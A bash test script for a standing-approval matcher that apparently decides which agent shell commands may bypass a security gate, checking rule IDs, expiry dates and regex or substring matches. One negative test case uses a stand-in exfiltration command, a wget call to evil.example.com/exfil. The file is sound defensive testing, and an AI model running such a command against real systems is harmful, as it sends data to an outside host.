#!/bin/bash
# test-standing-approvals.sh — tests for standing approval matching
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"

PASS=0
FAIL=0

assert_eq() {
    local desc="$1"
    local result="$2"
    local expected="$3"

    if [ "${result}" = "${expected}" ]; then
        echo "  ✓ ${desc}"
        PASS=$(( PASS + 1 ))
    else
        echo "  ✗ ${desc}"
        echo "    expected: ${expected}"
        echo "    got: ${result}"
        FAIL=$(( FAIL + 1 ))
    fi
}

echo "═══════════════════════════════════════"
echo " Standing Approvals Tests"
echo "═══════════════════════════════════════"

# ─── Setup: mock the standing approval check function ─────────────────────────
# We extract and test the matching logic in isolation, same pattern as
# test-approval-binding.sh tests hash math without invoking the full gate.

STANDING_APPROVALS_LOADED="true"
STANDING_APPROVAL_ID=""

# Create test approvals JSON
STANDING_APPROVALS_JSON='[
  {"id":"SA001","rule_id":"R016","match":{"command":{"regex":"curl.*(localhost|127\\.0\\.0\\.1)"}},"expires":"2099-12-31"},
  {"id":"SA002","rule_id":"R016","match":{"command":{"contains":"api.github.com"}},"expires":"2099-12-31"},
  {"id":"SA003","rule_id":"R013","match":{"command":{"regex":"(kill|killall).*(python|node)"}},"expires":"2099-12-31"},
  {"id":"SA004","rule_id":"R016","match":{"command":{"contains":"expired.example.com"}},"expires":"2020-01-01"},
  {"id":"SA005","rule_id":"R014","match":{"command":{"regex":"git +push.*(ZLAR-AI|origin)"}},"expires":"2099-12-31"}
]'

# Minimal log function for the check function
log() { :; }

# Import the check function
check_standing_approval() {
    local rule_id="$1"
    local command_text="$2"

    if [ "${STANDING_APPROVALS_LOADED}" != "true" ]; then
        return 1
    fi

    local count i sa_rule_id sa_expires sa_match_contains sa_match_regex sa_id
    count=$(echo "${STANDING_APPROVALS_JSON}" | jq 'length' 2>/dev/null)
    [ -z "${count}" ] || [ "${count}" = "0" ] && return 1

    local today
    today=$(date +%Y-%m-%d)

    for (( i=0; i<count; i++ )); do
        sa_rule_id=$(echo "${STANDING_APPROVALS_JSON}" | jq -r ".[$i].rule_id // \"\"" 2>/dev/null)
        [ "${sa_rule_id}" != "${rule_id}" ] && continue

        sa_expires=$(echo "${STANDING_APPROVALS_JSON}" | jq -r ".[$i].expires // \"\"" 2>/dev/null)
        if [ -n "${sa_expires}" ] && [[ "${today}" > "${sa_expires}" ]]; then
            continue
        fi

        sa_id=$(echo "${STANDING_APPROVALS_JSON}" | jq -r ".[$i].id // \"SA?\"" 2>/dev/null)

        sa_match_contains=$(echo "${STANDING_APPROVALS_JSON}" | jq -r ".[$i].match.command.contains // \"\"" 2>/dev/null)
        if [ -n "${sa_match_contains}" ]; then
            if [[ "${command_text}" == *"${sa_match_contains}"* ]]; then
                STANDING_APPROVAL_ID="${sa_id}"
                return 0
            fi
        fi

        sa_match_regex=$(echo "${STANDING_APPROVALS_JSON}" | jq -r ".[$i].match.command.regex // \"\"" 2>/dev/null)
        if [ -n "${sa_match_regex}" ]; then
            if [[ "${command_text}" =~ ${sa_match_regex} ]]; then
                STANDING_APPROVAL_ID="${sa_id}"
                return 0
            fi
        fi
    done

    return 1
}

# ─── Tests ────────────────────────────────────────────────────────────────────

echo ""
echo "── Contains matching ──"

check_standing_approval "R016" "curl -s https://api.github.com/repos" && r=0 || r=$?
assert_eq "R016 curl to api.github.com matches SA002" "$r" "0"
assert_eq "  matched approval ID is SA002" "${STANDING_APPROVAL_ID}" "SA002"

check_standing_approval "R016" "wget https://evil.example.com/exfil" && r=0 || r=$?
assert_eq "R016 wget to evil.example.com does NOT match" "$r" "1"

echo ""
echo "── Regex matching ──"

check_standing_approval "R016" "curl -s http://localhost:8080/test" && r=0 || r=$?
assert_eq "R016 curl to localhost matches SA001" "$r" "0"
assert_eq "  matched approval ID is SA001" "${STANDING_APPROVAL_ID}" "SA001"

check_standing_approval "R016" "curl -s http://127.0.0.1:3000/api" && r=0 || r=$?
assert_eq "R016 curl to 127.0.0.1 matches SA001" "$r" "0"

check_standing_approval "R013" "killall python3" && r=0 || r=$?
assert_eq "R013 killall python3 matches SA003" "$r" "0"
assert_eq "  matched approval ID is SA003" "${STANDING_APPROVAL_ID}" "SA003"

check_standing_approval "R013" "kill -9 node" && r=0 || r=$?
assert_eq "R013 kill node matches SA003" "$r" "0"

check_standing_approval "R013" "killall systemd" && r=0 || r=$?
assert_eq "R013 killall systemd does NOT match" "$r" "1"

check_standing_approval "R014" "git push origin main" && r=0 || r=$?
assert_eq "R014 git push origin matches SA005" "$r" "0"
assert_eq "  matched approval ID is SA005" "${STANDING_APPROVAL_ID}" "SA005"

echo ""
echo "── Rule ID filtering ──"

check_standing_approval "R099" "curl -s http://localhost:8080/test" && r=0 || r=$?
assert_eq "R099 (wrong rule) does not match any approval" "$r" "1"

echo ""
echo "── Expiry checking ──"

check_standing_approval "R016" "curl https://expired.example.com/test" && r=0 || r=$?
assert_eq "Expired approval (SA004, 2020-01-01) does NOT match" "$r" "1"

echo ""
echo "── Disabled state ──"

STANDING_APPROVALS_LOADED="false"
check_standing_approval "R016" "curl -s http://localhost:8080" && r=0 || r=$?
assert_eq "When disabled, nothing matches" "$r" "1"
STANDING_APPROVALS_LOADED="true"

echo ""
echo "═══════════════════════════════════════"
echo " Results: ${PASS} passed, ${FAIL} failed"
echo "═══════════════════════════════════════"

[ "${FAIL}" -gt 0 ] && exit 1
exit 0
